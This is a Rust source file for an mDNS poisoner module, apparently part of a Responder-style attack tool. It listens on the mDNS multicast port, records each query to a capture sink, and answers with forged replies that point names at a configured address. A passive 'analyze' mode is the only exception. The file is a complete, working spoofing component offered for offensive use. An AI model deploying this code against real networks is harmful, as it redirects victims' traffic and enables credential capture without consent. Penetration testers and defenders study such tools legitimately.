//! mDNS poisoner (RFC 6762). Listens on UDP 5353 / multicast 224.0.0.251.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;

use hickory_proto::op::{Message, MessageType};

use crate::capture::CaptureSink;
use crate::capture::model::Protocol;
use crate::constants::MDNS_MCAST_V4;
use crate::logger::Logger;

use super::{PoisonConfig, dns_response, query_event};

pub async fn run(
    iface_ip: Ipv4Addr,
    cfg: Arc<PoisonConfig>,
    sink: CaptureSink,
    logger: Arc<Logger>,
) -> anyhow::Result<()> {
    let bind = SocketAddr::from((Ipv4Addr::UNSPECIFIED, crate::constants::MDNS_PORT));
    let sock = super::bind_udp(bind, true, Some((MDNS_MCAST_V4, iface_ip)))?;
    logger.info("MDNS poisoned on 5353");
    let mut buf = vec![0u8; 65535];
    loop {
        let (n, src) = sock.recv_from(&mut buf).await?;
        let Ok(msg) = Message::from_vec(&buf[..n]) else {
            continue;
        };
        if msg.metadata.message_type != MessageType::Query {
            continue;
        }
        if src.ip() == std::net::IpAddr::V4(cfg.answer_ipv4) {
            continue;
        }
        let answered = !cfg.analyze;
        for q in &msg.queries {
            let name = q.name().to_utf8();
            sink.query(query_event(
                Protocol::Mdns,
                src.ip(),
                &name,
                &format!("{:?}", q.query_type()),
                answered,
                cfg.analyze,
            ));
        }
        if !cfg.analyze {
            let resp = dns_response(&msg, &cfg);
            if let Ok(bytes) = resp.to_vec() {
                let dest = SocketAddr::from((MDNS_MCAST_V4, crate::constants::MDNS_PORT));
                let _ = sock.send_to(&bytes, dest).await;
            }
        }
    }
}
